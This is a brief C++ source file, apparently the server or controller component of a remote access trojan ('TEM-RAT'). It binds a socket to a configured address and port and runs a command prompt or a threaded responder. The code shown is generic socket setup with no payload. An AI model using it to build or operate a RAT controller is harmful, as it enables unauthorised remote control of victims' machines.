#include "../../include/ratServer.hpp"

RatServer::RatServer(uint rsPortNo,const std::string rsIPAddr,
                     CSOCK_INIT ipv4_v6, CSOCK_INIT tcp_udp, bool threaded,bool serverInputed)
: rsPortNo(rsPortNo) , rsIPAddr(rsIPAddr){
    this->init_rsIPV = ipv4_v6;
    this->init_rsProtocol = tcp_udp;

    rs = new csock(init_rsProtocol,init_rsIPV);
    rs->setServer(CSOCK_DEFAULT_BACKLOG);
    this->ratServerConfig = rs->setServerSocketConfig(rsIPAddr.c_str(),rsPortNo);
    rs->bindServerSock();

    if(threaded)
        rs->serverResponserThread(serverInputed,"[TEM-RAT-SERVER] : RUNNING..."); 
    else 
        rs->serverResponser("[TEM-RAT-SERVER]$-> ");
}

RatServer::~RatServer(){
    delete rs;
}